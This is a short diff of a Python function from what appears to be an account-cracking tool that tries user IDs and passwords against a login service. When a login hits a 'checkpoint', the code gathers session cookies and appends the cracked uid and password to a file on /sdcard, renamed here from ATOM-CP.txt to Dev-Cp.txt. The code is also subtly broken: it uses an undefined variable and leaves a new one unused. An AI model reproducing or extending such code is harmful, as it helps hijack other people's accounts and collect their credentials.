@@ -2187,10 +2187,10 @@ def freeq(uid,pwx,tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
-                uid = "1000"+coki1[0:11]
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[141:156]
+                #print('\33[1;91m[DEV-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/Dev-Cp.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
